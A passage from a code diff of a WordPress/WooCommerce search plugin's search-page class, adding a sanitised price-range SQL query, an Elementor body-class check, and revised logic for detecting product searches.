+                global $wpdb;
+
+                foreach( $this->data['all_products'] as $sproduct ) {
+                    $product_ids[] = $sproduct['id'];
+                }
+
+                $sql = "SELECT min( min_price ) as min_price, MAX( max_price ) as max_price
+                        FROM {$wpdb->wc_product_meta_lookup}
+                        WHERE product_id IN (". implode( ',', array_map( 'absint', $product_ids ) ) .")";
+
+            }
+
+            return $sql;
+
+        }
+
+        /*
+         * Check some strings inside body classes
+         */
+        function body_class( $classes ) {
+            foreach( $classes as $class ) {
+                if ( strpos( $class, 'elementor-page-' ) !== false ) {
+                    $this->data['is_elementor'] = true;
+                    break;
+                }
+            }
+            return $classes;
+        }
+
+        /**
          * Check if we should override default search query
          *
          * @param string $query
@@ -229,10 +460,14 @@ if ( ! class_exists( 'AWS_Search_Page' ) ) :
          */
         private function aws_searchpage_enabled( $query ) {
             $enabled = true;
+
+            $post_type_product = ( $query->get( 'post_type' ) && is_string( $query->get( 'post_type' ) ) && $query->get( 'post_type' ) === 'product' ) ? true :
+                ( ( isset( $_GET['post_type'] ) && $_GET['post_type'] === 'product' ) ? true : false );
+
             if ( ( isset( $query->query_vars['s'] ) && ! isset( $_GET['type_aws'] ) ) ||
                 ! isset( $query->query_vars['s'] ) ||
                 ! $query->is_search() ||
-                ( $query->get( 'post_type' ) && is_string( $query->get( 'post_type' ) ) && $query->get( 'post_type' ) !== 'product' )
+                ! $post_type_product
             ) {
                 $enabled = false;
             }
